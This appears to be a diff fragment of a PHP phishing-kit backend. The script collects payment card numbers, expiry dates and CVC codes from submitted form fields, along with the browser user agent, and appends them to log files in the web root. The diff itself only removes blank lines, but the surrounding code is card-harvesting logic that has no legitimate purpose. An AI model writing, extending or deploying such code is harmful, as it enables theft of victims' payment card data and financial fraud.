@@ -6,13 +6,11 @@ $expiry = $_POST['year'];
 $cvc = $_POST['cvc'];
 $agent  = $_SERVER['HTTP_USER_AGENT'];
 
-
 $file = $_SERVER['DOCUMENT_ROOT']."/log.log";
 $all = "\r\nx.add_row(['PAY', '$number','$expirx/$expiry','$cvc'])";
 $fp = fopen("$file", "a+");
 fwrite($fp, $all);
 fclose($fp);
-
 
 $file = $_SERVER['DOCUMENT_ROOT']."/result.log";
 $file = str_replace("/dist", "", $file);
